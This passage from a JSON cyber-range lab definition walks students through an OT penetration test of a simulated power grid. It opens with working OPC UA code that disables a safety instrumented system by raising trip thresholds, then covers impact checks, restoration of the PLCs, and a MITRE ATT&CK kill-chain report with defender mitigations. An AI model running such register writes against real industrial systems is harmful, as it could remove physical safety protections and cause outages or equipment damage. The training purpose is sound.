('Overcurrent_Prot_Enabled', 0.0),\n                ('Overtemp_Prot_Enabled', 0.0),\n                ('Overspeed_Trip_RPM', 4500.0),\n                ('Overtemp_Trip_C', 200.0),\n            ]\n\n            for i in range(10):\n                for reg_name, attack_val in attacks:\n                    if reg_name in var_map:\n                        dv = ua.DataValue(ua.Variant(attack_val, ua.VariantType.Double))\n                        await var_map[reg_name].write_value(dv)\n\n                sis = await var_map['SIS_Armed'].read_value()\n                ospd = await var_map['Overspeed_Trip_Enabled'].read_value()\n                print(f'  [{i+1:2d}s] SIS_Armed={sis} Overspeed_Trip={ospd}')\n                await asyncio.sleep(1)\n\n            print('\\nSIS DISABLED. No safety net for the grid.')\n    finally:\n        await client.disconnect()\n\nasyncio.run(main())\nEOF\n```\n\n> **Reflect on the attack chain so far:** You've disabled three layers of defense:\n> 1. **Protection relays** (Phase 12) \u2014 No automatic fault isolation\n> 2. **Load shedding** (Phase 12) \u2014 No automatic load reduction during frequency excursion\n> 3. **Safety Instrumented System** (this phase) \u2014 No emergency shutdown capability\n>\n> The grid is now completely unprotected. In a real scenario, the attacker could now cause a process upset (overload a generator, create a fault on a bus) and there would be nothing to prevent it from cascading into a wide-area blackout with physical equipment damage.\n\n**MITRE ATT&CK:** [T0880 - Loss of Safety](https://attack.mitre.org/techniques/T0880/), [T0836 - Modify Parameter](https://attack.mitre.org/techniques/T0836/)"
          }
        ]
      },
      {
        "id": "phase15",
        "name": "Verify Cascading Impact",
        "steps": [
          {
            "id": "step15_1",
            "vm": "eng-ws-ot",
            "title": "Assess Attack Impact via Historian and HMIs",
            "content": "### Attack Damage Assessment\n\nA real adversary would verify their attack succeeded. An incident responder would perform the same checks to understand the scope of compromise. Query the historian and HMIs to see the combined effect of all your attacks.\n\n```bash\ncurl -s http://172.16.3.10:8080/api/latest | python3 << 'EOF'\nimport sys, json\n\ndata = json.load(sys.stdin)\n\nprint('=== ATTACK IMPACT ASSESSMENT ===')\nprint()\n\nif 'plc-sub-b' in data:\n    print('--- Substation B (Breakers) ---')\n    for reg, info in sorted(data['plc-sub-b'].items()):\n        print(f'  {reg}: {info[\"value\"]}')\n\nif 'plc-sub-a' in data:\n    print('\\n--- Substation A (Protection) ---')\n    for reg, info in sorted(data['plc-sub-a'].items()):\n        print(f'  {reg}: {info[\"value\"]}')\n\nif 'plc-load' in data:\n    print('\\n--- Load Management ---')\n    for reg, info in sorted(data['plc-load'].items()):\n        print(f'  {reg}: {info[\"value\"]}')\n\nif 'plc-safety' in data:\n    print('\\n--- Safety System (SIS) ---')\n    for reg, info in sorted(data['plc-safety'].items()):\n        print(f'  {reg}: {info[\"value\"]}')\n\nif 'rtu-dist' in data:\n    print('\\n--- Distribution Network ---')\n    for reg, info in sorted(data['rtu-dist'].items()):\n        print(f'  {reg}: {info[\"value\"]}')\nEOF\n```\n\nAlso verify visually through the HMI dashboards:\n```bash\ncurl -s http://172.16.4.10:8080/ | grep -i 'alarm\\|status\\|value' | head -10\ncurl -s http://172.16.4.20:8080/ | grep -i 'alarm\\|status\\|value' | head -10\ncurl -s http://172.16.4.30:8080/ | grep -i 'alarm\\|status\\|value' | head -10\n```\n\n### Combined Attack Impact \u2014 Cascading Failure Scenario\n\n> **Walk through the cascade:**\n> 1. **Breakers tripped** \u2192 Substation de-energized \u2192 Customers lose power\n> 2. **Protection disabled** \u2192 Any fault propagates unchecked to neighboring equipment\n> 3. **Load shedding disabled** \u2192 System frequency drops without automatic correction \u2192 More generators trip on underfrequency\n> 4. **SIS disabled** \u2192 No emergency shutdown \u2192 Turbine can overspeed, generator can overcurrent, stator can overheat\n> 5. **Distribution reclosers open** \u2192 Feeders cannot automatically restore \u2192 Manual restoration required\n>\n> **Real-world parallels:**\n> - **CRASHOVERRIDE (Ukraine, 2016)**: Opened breakers via ICS protocols \u2192 225,000 customers lost power for 1-6 hours\n> - **TRITON/TRISIS (Saudi Arabia, 2017)**: Targeted the SIS to enable a potentially destructive physical attack on a petrochemical facility\n> - **Industroyer2 (Ukraine, 2022)**: Attempted to disrupt Ukrainian power grid substations during wartime\n\n**MITRE ATT&CK:** [T0813 - Denial of Control](https://attack.mitre.org/techniques/T0813/), [T0826 - Loss of Availability](https://attack.mitre.org/techniques/T0826/), [T0837 - Loss of Protection](https://attack.mitre.org/techniques/T0837/)"
          }
        ]
      },
      {
        "id": "phase16",
        "name": "Restore & Report",
        "steps": [
          {
            "id": "step16_1",
            "vm": "eng-ws-ot",
            "title": "Restore All PLCs to Safe Defaults",
            "content": "**Critical:** Always restore systems to safe operating state after a penetration test. In OT environments, leaving systems in an attacked state can cause real process disruptions.\n\n### Restore Modbus PLCs\n\nUsing the baseline values you recorded in Phase 9, restore all registers to their safe defaults:\n\n```bash\npython3 << 'EOF'\nfrom pymodbus.client import ModbusTcpClient\nimport time\n\nrestorations = {\n    'plc-sub-b (Breakers)': ('172.16.5.20', [\n        (0, 1, 'Breaker_1'), (1, 1, 'Breaker_2'),\n        (2, 1, 'Breaker_3'), (3, 1, 'Bus_Tie'),\n        (20, 1, 'Cap_Bank_1'), (21, 0, 'Cap_Bank_2')\n    ]),\n    'plc-sub-a (Protection)': ('172.16.5.10', [\n        (10, 1200, 'Overcurrent_Trip_A'),\n        (20, 1, 'Autorecloser_Enabled'),\n        (30, 1, 'Protection_Status')\n    ]),\n    'plc-load (Load Mgmt)': ('172.16.5.40', [\n        (20, 1, 'Auto_Shed_Enabled'),\n        (13, 59, 'Freq_Trigger_Stage1'),\n        (14, 58, 'Freq_Trigger_Stage2')\n    ]),\n    'rtu-dist (Distribution)': ('172.16.5.60', [\n        (10, 1, 'Recloser_1'), (11, 1, 'Recloser_2'),\n        (12, 1, 'Recloser_3'), (21, 1, 'Cap_Bank')\n    ])\n}\n\nfor name, (ip, regs) in restorations.items():\n    print(f'\\nRestoring {name} ({ip})...')\n    client = ModbusTcpClient(ip, port=502, timeout=5)\n    client.connect()\n    for addr, val, label in regs:\n        for _ in range(3):\n            client.write_register(addr, val, slave=1)\n            time.sleep(0.3)\n        r = client.read_holding_registers(addr, 1, slave=1)\n        status = 'OK' if r.registers[0] == val else 'MISMATCH'\n        print(f'  [{addr}] {label} = {r.registers[0]} (target: {val}) [{status}]')\n    client.close()\n\nprint('\\nAll Modbus PLCs restored.')\nEOF\n```\n\n### Restore the Safety Instrumented System\n\n```bash\npython3 << 'EOF'\nimport asyncio\nfrom asyncua import Client, ua\n\nasync def main():\n    client = Client('opc.tcp://172.16.5.50:4840', timeout=15)\n    await asyncio.wait_for(client.connect(), timeout=10)\n    try:\n        objects = client.get_objects_node()\n        children = await objects.get_children()\n        for child in children:\n            name = await child.read_browse_name()\n            if 'Safety' not in str(name):\n                continue\n            variables = await child.get_children()\n            var_map = {}\n            for var in variables:\n                vname = await var.read_browse_name()\n                var_map[vname.Name] = var\n\n            restores = [\n                ('SIS_Armed', 1.0),\n                ('Overspeed_Trip_Enabled', 1.0),\n                ('Overspeed_Trip_RPM', 3780.0),\n                ('Generator_Prot_Enabled', 1.0),\n                ('Overcurrent_Prot_Enabled', 1.0),\n                ('Overtemp_Prot_Enabled', 1.0),\n                ('Overtemp_Trip_C', 130.0),\n            ]\n\n            print('Restoring SIS...')\n            for i in range(5):\n                for reg_name, val in restores:\n                    if reg_name in var_map:\n                        dv = ua.DataValue(ua.Variant(val, ua.VariantType.Double))\n                        await var_map[reg_name].write_value(dv)\n                await asyncio.sleep(1)\n\n            for reg_name, expected in restores:\n                val = await var_map[reg_name].read_value()\n                status = 'OK' if val == expected else 'MISMATCH'\n                print(f'  {reg_name:30s} = {val} [{status}]')\n\n            print('\\nSIS restored to safe defaults.')\n    finally:\n        await client.disconnect()\n\nasyncio.run(main())\nEOF\n```\n\n**Verify restoration** by checking the historian and HMIs one final time to confirm all values have returned to normal operating ranges."
          },
          {
            "id": "step16_2",
            "vm": "eng-ws-ot",
            "title": "Document the Attack Chain and Lessons Learned",
            "content": "### Mapping the Kill Chain\n\nA professional penetration test report maps every action to a framework. Here's the complete attack chain using both MITRE ATT&CK (Enterprise) and MITRE ATT&CK for ICS:\n\n**IT Kill Chain (ATT&CK Enterprise):**\n\n| Phase | Technique | What We Did | How Defenders Could Have Stopped It |\n|-------|-----------|-------------|-------------------------------------|\n| Reconnaissance | T1046, T1592, T1589 | Port scanning, WordPress user enum | Disable REST API user enumeration, remove employee directory |\n| Initial Access | T1110.001 | WordPress brute force | Account lockout policy, MFA, CAPTCHA |\n| Credential Access | T1110.003, T1078 | AD password spray with reused creds | Enforce unique passwords per system, MFA on AD |\n| Lateral Movement | T1021.004 | SSH with reused credentials | Restrict SSH access by IP, require key-based auth |\n| Collection | T1552.001, T1005 | wp-config extraction, database dump | Encrypt sensitive fields, restrict DB access |\n| Pivot | T0886 | Used harvested VPN creds to reach OT | MFA on VPN, separate OT credentials from IT |\n\n**OT Kill Chain (ATT&CK for ICS):**\n\n| Phase | Technique | What We Did | How Defenders Could Have Stopped It |\n|-------|-----------|-------------|-------------------------------------|\n| Discovery | T0846, T0861 | ICS protocol scanning, register enumeration | ICS-aware IDS (e.g., Claroty, Dragos, Nozomi) |\n| Collection | T0801, T0868 | Historian data, HMI dashboards | Authenticate historian API, segment HMI network |\n| Inhibit Response | T0836, T0880 | Disable protection, load shedding, SIS | Read-only registers for safety parameters, hardware key switches |\n| Impair Process | T0855, T0831 | Trip breakers, open reclosers | Modbus write monitoring, protocol allowlisting |\n| Impact | T0826, T0813, T0837 | Loss of availability, control, and protection | Defense-in-depth, network segmentation, OT-specific monitoring |\n\n### Key Findings for Defenders\n\n> **Reflect on the entire attack chain and identify the critical failures:**\n>\n> 1. **Credential reuse** across IT and OT systems was the #1 enabler of the entire chain\n> 2. **ICS protocols have no authentication** \u2014 Modbus and OPC UA (as configured) accept commands from anyone\n> 3. **Historian data in the DMZ** leaked complete OT topology to anyone who reached the DMZ\n> 4. **SIS was accessible from the engineering workstation** without additional authentication or physical key switches\n> 5. **No ICS-specific monitoring** \u2014 no alerts on Modbus writes, OPC UA connections, or abnormal register values\n> 6. **Flat OT network** \u2014 the engineering workstation had unrestricted access to all PLCs, HMIs, and the SIS\n>\n> In a real environment, mitigations would include: network segmentation (micro-segmentation within OT), ICS protocol monitoring (Dragos, Claroty, Nozomi), separate credential stores for IT and OT, MFA everywhere, hardware key switches on safety systems, and regular penetration testing like this exercise.\n\n### Real-World Parallels\n\n- **[CRASHOVERRIDE (2016)](https://attack.mitre.org/software/S0604/)**: Opened breakers via ICS protocols to cause Ukrainian power outage \u2014 225,000 customers affected\n- **[TRITON/TRISIS (2017)](https://attack.mitre.org/software/S0609/)**: Targeted Schneider Triconex SIS in Saudi petrochemical plant \u2014 could have caused explosion\n- **[Industroyer2 (2022)](https://attack.mitre.org/software/S1072/)**: Attempted to disrupt Ukrainian power grid substations during wartime\n- **[Oldsmar Water Treatment (2021)](https://www.cisa.gov/news-events/alerts/2021/02/11/compromise-us-water-treatment-facility)**: Attacker modified sodium hydroxide levels via remote access \u2014 caught by an alert operator"
          }
        ]
      }
    ]
  },
  "content_hash": "",
  "assets": []
}